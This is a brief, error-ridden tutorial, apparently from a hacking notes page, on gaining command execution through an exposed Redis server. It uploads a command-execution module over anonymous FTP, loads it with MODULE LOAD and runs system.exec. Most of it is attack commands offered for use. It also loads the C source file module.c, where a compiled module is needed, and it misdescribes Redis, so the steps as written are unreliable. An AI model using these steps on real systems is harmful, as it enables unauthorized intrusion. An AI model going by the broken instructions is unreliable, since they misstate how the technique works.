Redis Cli Penetration testing 
If you facing the machine which port open FTP AND REDIS THAN YOU TRY THIS STEPS LETS SEE WHAT HAPPNED....

Redis cli is a nosql server this server is connected to shell
So if you want to able redit cli command than you try one think ...

redis-cli -h <target-Ip>

Now you open a new terminal 
You save the you kali terminal this file

https://github.com/n0b0dyCN/RedisModules-ExecuteCommand/blob/master/src/module.c

Now you open ftp server

ftp <target-ip>

ftp > put module.c
ftp > exit

Now you return redic-cli and run

redis-cli > MODULE LOAD /var/ftp/pub/module.c
radis-cli > system.exec "id"

Boom system id show now you able to access the system
So now you try RCE ( remote code execution ) or other techniques to access system .
